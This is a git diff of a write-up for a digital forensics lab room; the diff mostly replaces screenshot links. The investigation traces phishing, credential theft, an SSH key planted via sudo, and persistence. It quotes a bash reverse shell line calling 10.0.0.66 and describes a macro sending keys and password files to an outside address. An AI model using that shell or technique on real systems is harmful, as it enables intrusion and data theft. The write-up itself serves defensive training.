@@ -86,11 +86,16 @@ Courts and regulators are still working out how AI-generated evidence fits exist
 source /opt/dfir-env/bin/activate
 ```
 
+<img width="1055" height="149" alt="708934118-7424beee-b23d-4c5d-a84f-9fe9ffff3c5c" src="https://github.com/user-attachments/assets/54e03d7e-affa-44c9-a284-15b8338edf00" />
+
+
 ### Step 1: Classify the authentication log
 
 ```
 python3 /opt/dfir-lab/classify_logs.py /var/log/auth.log
 ```
+<img width="1550" height="167" alt="image" src="https://github.com/user-attachments/assets/47a77655-2a2d-4021-a2f5-a61b0875690c" />
+
 
 The script, trained on labelled log data, flagged three lines:
 
@@ -102,7 +107,7 @@ The script, trained on labelled log data, flagged three lines:
 
 Read together, these show a failed attempt on a nonexistent `admin` account, then a successful password login as `j.morgan` a minute later, then a public key login as `r.house` fourteen minutes after that, all from the same address and all at 3 AM. The move from a failed guess to a success suggests the attacker had obtained credentials from somewhere, and the switch from password to public key for `r.house` is a clue worth following, because it means a key had to be in place on that account first. The answer to when the attacker logged in as `j.morgan` is **03:01:02**.
 
-![Output of classify_logs.py and file_anomalies.py](images/01-classify-logs-and-file-anomalies.png)
+<img width="1568" height="653" alt="image" src="https://github.com/user-attachments/assets/036c98b5-1ada-4866-ab55-da54f4f86b50" />
 
 The screenshot above also contains the output of the file scan in the next step.
 
@@ -138,7 +143,8 @@ ls
 invoice_Q1_2075.ods
 ```
 
-![The invoice spreadsheet in j.morgan's Invoices folder](images/02-invoice-ods-location.png)
+<img width="1010" height="392" alt="image" src="https://github.com/user-attachments/assets/14163ad5-f67a-44e5-a3fe-ed6d192bb396" />
+
 
 Per the room, this spreadsheet has an embedded macro that runs shell commands, harvests `.bash_history`, SSH keys and session data, dumps `/etc/passwd`, and tries to exfiltrate to `192.168.0.100`. That is the same address the SSH logins came from, which ties the stolen data to the login activity.
 
@@ -151,9 +157,11 @@ cd /home/j.morgan/Mail/inbox
 cat email_invoice.eml
 ```
 
+<img width="1568" height="646" alt="image" src="https://github.com/user-attachments/assets/a0b9b53e-d5a4-447b-be98-597ed5fc90ea" />
+
+
 The email was sent from `akeane@poseidonenergy.net`, posing as the Director of Field Operations at Poseidon Energy, with the subject "URGENT - Outstanding Invoice Q1 2075", saying the invoice was overdue and had to be reviewed immediately, and attaching `invoice_Q1_2075.ods`. The urgency, the threat of escalation and the unexpected attachment are classic phishing markers. This confirms the initial access method as **phishing**.
 
-![The phishing email in j.morgan's inbox](images/06-phishing-email.png)
 
 ### Step 5: Work out the privilege escalation
 
@@ -171,7 +179,7 @@ sudo nano /home/r.house/.ssh/authorized_keys
 exit
 ```
 
-![j.morgan's bash history](images/03-j-morgan-bash-history.png)
+<img width="1007" height="373" alt="image" src="https://github.com/user-attachments/assets/6c504ba0-44c5-467f-98c3-a9fd3a3dfdee" />
 
 The key line is `sudo nano /home/r.house/.ssh/authorized_keys`. No exploit was needed: `j.morgan` was able to use `sudo` to edit another user's `authorized_keys`, so the attacker planted their own public key there and then logged in as `r.house` with it, which matches the 03:15:00 `Accepted publickey` entry. The history has no timestamps, so I cannot prove when the edit happened, but the log timing puts it between the `j.morgan` login at 03:01:02 and the `r.house` login at 03:15:00. This was abuse of legitimate permissions and not a technical vulnerability, which makes it harder for automated tools to spot. The history also mixes the victim's actions (opening the invoice) with the attacker's, and it cannot tell them apart on its own.
 
@@ -191,8 +199,8 @@ bash -i >& /dev/tcp/10.0.0.66/5555 0>&1
 cat /opt/robbco/sys/boot_monitor.log
 Jan 15 03:22:10 bios_hook: UOS boot intercepted at 0x400f2
 ```
+<img width="1021" height="343" alt="image" src="https://github.com/user-attachments/assets/41491872-f951-4ec0-85e5-a1a60ba4ed57" />
 
-![The sysmon reverse shell and the fake boot_monitor.log](images/04-sysmon-and-boot-monitor-log.png)
 
 This single line makes `sysmon` look like part of normal boot telemetry, and its timestamp (03:22:10) falls after the `r.house` login, which fits persistence being set up once the attacker had elevated access. The two reverse shells also show the attacker's thinking: `.x` runs as the unprivileged user and is temporary, while `sysmon` was placed after escalation for long-term access.
 
@@ -211,7 +219,7 @@ INIT HW
 BOOT UOS
 ```
 
-![RobbCo's proprietary source files, flagged as suspicious by the model](images/05-proprietary-source-files.png)
+<img width="1007" height="422" alt="image" src="https://github.com/user-attachments/assets/4424b7ca-b349-4df8-8017-e175bf3c62d4" />
 
 These are the company's proprietary code, so they are not malicious. They are **false positives**, which is the lesson the room wants: the model flagged them as unusual but a human has to judge what unusual means. The real finding is `/dev/shm/.core_dump_2025.tgz.enc`, a base64-encoded archive staged in shared memory, which is a stealthy place to stage data. The room confirms it by decoding and unpacking it (`base64 -d` into a tar.gz, then `tar -xzvf`), which shows it holds RobbCo's source code, so the firmware, bootloader and operating system code were all stolen. The full path of the archive is **/dev/shm/.core_dump_2025.tgz.enc**.
 
